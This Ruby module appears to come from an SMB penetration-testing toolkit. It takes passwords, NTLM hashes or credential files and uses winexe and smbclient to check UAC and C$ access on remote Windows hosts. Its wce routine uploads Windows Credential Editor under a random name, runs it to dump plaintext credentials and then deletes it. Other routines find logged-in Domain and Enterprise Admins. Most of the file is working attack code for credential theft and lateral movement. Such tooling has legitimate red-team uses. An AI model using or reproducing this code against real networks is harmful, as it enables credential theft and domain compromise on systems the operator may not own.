require 'utils'

module Lib_smb
	include Utils

	# Method to ask for smb info
	def smb_auth_info
		# prompt user for username
		print "Username [#{color_banner(Menu.get_banner[:creds].sub(/.*\\/,''))}]"
		temp_user = rgets(" : ")
		user = parse_creds(temp_user)

		# If credential file...
		if user
			banner = color_banner("#{user.length} credentials found")
			print_good("Parsed credential file [#{banner}]")
			Menu.opts[:creds] = user
		# Else if user provided...
		else
			# prompt user for password
			print "Password or hash (<LM>:<NTLM>) [#{Menu.get_banner[:password]}]"
			pass = rgets(" : ")

			# If empty, continue with current creds
			unless temp_user.empty? and pass.empty?
				if pass.is_ntlm?
					Menu.update_banner(color_banner("Pass: NTLM Hash"), :password)					
				else
					Menu.update_banner(color_banner("Pass: #{pass}"), :password)
				end
				Menu.opts[:creds][0][0] = temp_user unless temp_user.empty?
				Menu.opts[:creds][0][1] = pass.escape!('\\"$') unless pass.empty?
			end
		end

		# Check if domain is localhost, if so use . to auto pick domain
		domain_banner = Menu.opts[:domain]
		domain_banner = "LOCALHOST" if Menu.opts[:domain].eql? '.'

		# prompt user for domain
		print "Domain [#{color_banner(domain_banner)}] :"
		domain = rgets
		
		# Update banner before switching to period if needed
		domain_banner = domain unless domain.empty?
		domain = '.' if domain.upcase.eql? "LOCALHOST"

		# Only update if user provides data
		Menu.opts[:domain] = domain unless domain.empty?

		# Update banner with correct credential banner
		if user
			Menu.update_banner(color_banner("#{domain_banner}\\#{user.length} accounts"), :creds)
		elsif not temp_user.empty? and not pass.empty?
			Menu.update_banner(color_banner("#{domain_banner}\\#{Menu.opts[:creds][0][0]}"), :creds)
		end
	end

	# Parse the 
	def parse_creds(users)
		# If file, split by new lines. 
		if File.file? users
			contents = ''
			begin
				contents = File.read(users)
			rescue
				print_bad("Could not read from credential file #{users}")
				return nil
			end
			users = contents.gsub(/\n/, ' ')
			
			creds = Array.new
			begin
				# Split all values by spaces
				users.split(' ').each { |e|
					# Check for chars followed by : followed by chars
					if e =~ /.+?:.+?/
						user, pass = e.split(':')
						cred_set = [user, pass.escape!('\\"$')]
						creds << cred_set
					else
						print_warning("Could not parse credential set #{e}")
					end
				}
				creds.uniq!
				return creds
			rescue => e
				print_bad("Unhandled error: #{e}")
			end
		else
			return nil
		end
	end

	# Method to check if UAC is enabled
	def check4uac(username, password, host)
		uac = winexe("--uninstall //#{host}", "CMD /C reg QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD")
		uac_clean = uac.split(" ")
		# inspect uac reg query output for
		if uac_clean.include?("0x1")
			print_bad("#{host.ljust(15)} - UAC Enabled")
			return true
		elsif uac_clean.include?("0x0")
			print_good("#{host.ljust(15)} - UAC Disabled")
			return false
		else
			print_bad("#{host.ljust(15)} - Unable to access registry or value did not exist")
			return false
		end
	end

	def check4remotelogin(username, password, host, share = 'C$')
		# Command to use with smbexeclient
		smbclient_output = smbclient("//#{host}/#{share}", "-c showconnect")
		
		# If share is returned access exists
		if smbclient_output =~ /^\/\/#{host}\//
			return true
		else
			return false
		end
	end

	def wce(username, password, host)
		smboptions = "--system //#{host}"
		
		temp_dir = ''		
		3.times do
			temp_dir = winexe(smboptions,"CMD /C echo %TEMP%").chomp
			break unless temp_dir.empty?
			sleep 3
		end
		wceexe = '' 

		# Stop error out if machine is not on a domain
		unless temp_dir.empty?
			wceexe = Menu.extbin[:wce]
	
			# Create random name for wce, between 8 and 12 characters in length
			wce_upload_name = "#{random_name}.exe"

			vprint_status("#{host.ljust(15)} - Uploading wce.exe as #{wce_upload_name}")
			
			# Upload, execute, and delete wce
			wce_copy = smbclient("//#{host}/C$ -c", "put #{wceexe} #{temp_dir.sub('C:', '')}\\#{wce_upload_name}")
			
			wce_results = winexe(smboptions, "CMD /C #{temp_dir}\\#{wce_upload_name} -w")
			wce_del = winexe("--uninstall #{smboptions}", "CMD /C del #{temp_dir}\\#{wce_upload_name}")
			### put checks to see if delete worked

			# Parse wce results
			wce_parsed = ''
			wce_results.each_line do |line|
				# Trigger on colon for lines with user/pass
				if line =~ /:/
					# Get rid of bad lines
					unless line =~ /non-printable|ERROR|HASH/
						wce_parsed << "#{line.strip}\n"
					end
				end
			end

			return wce_parsed
		else
			print_warning("#{host.ljust(15)} - Issues determining temp directory, stopped WCE upload")
			return ""
		end
	end

	def loggedin(username, password, host)
		loggedin = winexe("--uninstall --system //#{host}","CMD /C tasklist /V /FO CSV")
		loggedin = loggedin.encode!('UTF-8', 'UTF-8', :invalid => :replace).split(/\r?\n/)
		users = []
		# Parse users
		if loggedin
			loggedin.each_with_index { |line, index|
				# Skip first element
				next if index == 0
				domain, user = line.split('"')[13].gsub(/"/, '').split('\\')
				# Skip if built in account
				next if domain.eql?("NT AUTHORITY")
				users << user unless user.to_s.empty?
			}
		else
			@logger.error(loggedin)
		end
		# Unique and return the array
		return users.uniq!
	end

	# Method to check if Domain or Enterprise admin processes/sessions exist
	def check4da(username, password, host)
		admins = winexe("--system //#{host}", "CMD /C net group \"Domain Admins\" /domain && net group \"Enterprise Admins\" /domain")

		# Variable setup
		delim = '-' * 79
		hit_delim = false
		da_users = []

		# Split by new line and iterate
		admins.encode!('UTF-8', 'UTF-8', :invalid => :replace).split(/\r?\n/).each {|e|
			e.encode!('UTF-8', 'UTF-8', :invalid => :replace)
			hit_delim = false if e.eql? "The command completed successfully."
			# Squish white space, remove trailing white space, and split on white space
			# to return an array of users
			da_users << e.gsub(/\s+/, ' ').chomp(' ').split(' ') if hit_delim
			hit_delim = true if e.eql? delim
		}
		domain_admins = []

		# Check if any logged in user matches any domain/enterprise admin
		unless da_users.empty?

			# Flatten and remove duplicates
			da_users.flatten!.uniq!

			# Get logged in users
			users = loggedin(username, password, host)
			unless users.to_a.empty?
				da_users.each { |da|
					users.each { |user|
						if da.eql? user 
							print_good("#{host.ljust(15)} - Admin #{highlight(user)} logged in")
							domain_admins << user
						end
					}
				}
			end
		end

		unless domain_admins.empty?
			return domain_admins
		else
			return nil
		end
	end
end
